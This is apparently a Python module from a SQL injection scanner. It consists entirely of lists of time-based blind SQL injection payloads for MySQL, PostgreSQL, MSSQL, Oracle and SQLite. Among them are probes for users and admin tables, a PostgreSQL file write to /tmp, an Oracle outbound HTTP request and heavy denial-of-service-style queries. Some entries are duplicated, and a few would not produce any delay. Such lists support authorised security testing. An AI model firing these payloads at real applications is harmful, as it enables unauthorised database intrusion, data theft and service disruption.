TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "' AND SLEEP(5)--",
    "'; SLEEP(5)--",
    "'; SLEEP(5)#",
    "1 AND SLEEP(5)",
    "1 AND SLEEP(5)--",
    "1 AND SLEEP(5)#",
    "1'; SELECT SLEEP(5)--",
    "1'; SELECT SLEEP(5)#",
    "' OR SLEEP(5)--",
    "' OR SLEEP(5)#",
    "') OR SLEEP(5)--",
    "') OR SLEEP(5)#",
    "') AND SLEEP(5)--",
    "') AND SLEEP(5)#",
    "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--",
    "1' AND (SELECT * FROM (SELECT SLEEP(2))b)--",
    "' AND (SELECT * FROM (SELECT SLEEP(3))a)--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "1 AND WAITFOR DELAY '00:00:05'",
    "1'; IF(1=1) WAITFOR DELAY '00:00:05'--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "1' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--",
    "1' AND (SELECT CASE WHEN 1=2 THEN SLEEP(5) ELSE 0 END)--",
    "' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--",
    "1' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM admin) > 0 AND SLEEP(5)--",
    "1' AND EXISTS(SELECT * FROM users) AND SLEEP(5)--",
    "1' AND EXISTS(SELECT * FROM admin) AND SLEEP(5)--",
    "' AND 1=1 AND SLEEP(5)--",
    "' AND 1=2 AND SLEEP(5)--",
    "1 AND 1=1 AND SLEEP(5)",
    "1 AND 1=2 AND SLEEP(5)",
]

TIME_PAYLOADS_MYSQL = [
    "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
    "1' AND (SELECT COUNT(*) FROM mysql.user) > 0 AND SLEEP(5)--",
    "1' AND (SELECT LENGTH(VERSION())>0 AND SLEEP(5))--",
    "1'; SELECT BENCHMARK(5000000,MD5('test'))--",
    "1'; DO SLEEP(5)--",
    "1'; DO SLEEP(5)#",
    "1' AND (SELECT SLEEP(5) FROM DUAL)--",
    "1' AND ROW(1,1)>(SELECT COUNT(*) FROM mysql.user) AND SLEEP(5)--",
]

TIME_PAYLOADS_POSTGRESQL = [
    "1'; SELECT pg_sleep(5)--",
    "1' AND (SELECT pg_sleep(5))>0--",
    "1'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--",
    "1'; SELECT (SELECT 1 FROM pg_sleep(5))--",
    "1' AND (SELECT 1 FROM pg_locks WHERE granted=true LIMIT 1) IS NULL AND SLEEP(5)--",
    "1'; COPY (SELECT '') TO '/tmp/test.txt'--",
]

TIME_PAYLOADS_MSSQL = [
    "1'; WAITFOR DELAY '00:00:05'--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "1'; IF(1=1) WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--",
    "1'; SELECT DATEADD(s,5,GETDATE())--",
    "1'; DECLARE @s VARCHAR(8000); SET @s=DB_NAME(); WAITFOR DELAY '00:00:05'--",
    "1'; BEGIN TRY SELECT 1/0 END TRY BEGIN CATCH WAITFOR DELAY '00:00:05' END CATCH--",
]

TIME_PAYLOADS_ORACLE = [
    "1'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
    "1'; SELECT UTL_HTTP.REQUEST('http://test.com') FROM DUAL; END;--",
    "1'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('test',5) FROM DUAL--",
    "1'; SELECT CTXSYS.DRITHSX.SN(user,(SELECT 1 FROM DUAL)) FROM DUAL; END;--",
    "1'; SELECT DBMS_UTILITY.GET_TIME FROM DUAL; END;--",
]

TIME_PAYLOADS_SQLITE = [
    "1'; SELECT (SELECT 1 FROM (SELECT 1)x WHERE 1=sqlite_compileoption_get('ENABLE_RTREE',0))--",
    "1'; SELECT randomblob(1000000000)--",
    "1'; SELECT RAISE(IGNORE,'test')--",
]

HEAVY_TIME_PAYLOADS = [
    "1' AND (SELECT COUNT(*) FROM information_schema.tables, information_schema.columns, information_schema.routines)>0 AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM all_tables, all_tab_columns, all_synonyms)>0 AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM sys.tables, sys.columns, sys.procedures)>0 AND SLEEP(5)--",
    "1'; DECLARE @i INT=1; WHILE @i<=100000 BEGIN SET @i=@i+1; END; WAITFOR DELAY '00:00:05'--",
]
